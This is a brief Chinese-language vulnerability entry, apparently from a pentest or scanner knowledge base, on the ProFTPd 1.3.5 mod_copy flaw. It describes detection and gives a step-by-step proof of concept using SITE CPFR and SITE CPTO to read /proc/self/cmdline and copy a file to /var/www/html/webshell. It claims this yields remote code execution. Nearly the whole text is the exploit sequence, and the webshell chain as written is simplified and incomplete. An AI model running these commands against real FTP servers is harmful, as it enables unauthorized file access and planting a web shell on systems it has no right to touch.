验证漏洞存在方法
    - 通过FTP连接到目标服务器的21端口
    - 尝试使用site cpfr命令读取/proc/self/cmdline文件
    - 尝试使用site cpto命令将文件复制到临时位置
    - 如果返回"Copy successful"响应，则说明漏洞存在

漏洞利用方法
    - ProFTPd 1.3.5的mod_copy模块存在安全漏洞，允许远程攻击者通过site cpfr和site cpto命令读取和写入任意文件
    - 攻击者可以利用此漏洞读取敏感文件（如/proc/self/cmdline获取进程信息）或将恶意文件写入可访问目录
    - 通过组合文件读取和写入操作，攻击者可以实现远程代码执行
    
    - PoC:
    ```
    1. 连接到目标FTP服务器
    2. 发送命令: site cpfr /proc/self/cmdline
    3. 发送命令: site cpto /tmp/.random_filename
    4. 发送命令: site cpfr /tmp/.random_filename  
    5. 发送命令: site cpto /var/www/html/webshell
    6. 如果返回"Copy successful"，则漏洞验证成功
    ```
